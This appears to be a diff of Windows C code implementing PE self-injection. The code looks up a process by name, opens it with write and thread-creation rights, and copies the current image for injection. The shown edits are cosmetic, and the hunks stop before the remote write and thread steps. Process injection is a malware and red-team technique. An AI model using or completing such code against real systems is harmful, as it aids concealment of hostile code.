@@ -12,7 +12,7 @@
 typedef struct BASE_RELOCATION_ENTRY {
     USHORT Offset : 12;
     USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+}BASE_RELOCATION_ENTRY;
 
 uint32_t get_pid_by_name(const char* ProcessName) {
     PROCESSENTRY32 pt = {
@@ -33,7 +33,7 @@ uint32_t get_pid_by_name(const char* ProcessName) {
 }
 
 bool self_inject(uint32_t process_id, LPTHREAD_START_ROUTINE entry_point, void* parameter) {
-    // Open the target process - this is process we will be injecting this PE into
+    // Open the target process - this is the process we will be injecting this PE into
     HANDLE target_process = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, FALSE, process_id);
 
     // Get current image's base address
@@ -42,7 +42,7 @@ bool self_inject(uint32_t process_id, LPTHREAD_START_ROUTINE entry_point, void* 
     IMAGE_NT_HEADERS* nt_header = (image_base + dos_header->e_lfanew);
 
     // Allocate a new memory block and copy the current PE image to this new memory block
-    void* local_image = VirtualAlloc(NULL, nt_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
+    void* local_image = malloc(nt_header->OptionalHeader.SizeOfImage);
     memcpy(local_image, image_base, nt_header->OptionalHeader.SizeOfImage);
 
     // Allocate a new memory block in the target process. This is where we will be injecting this PE
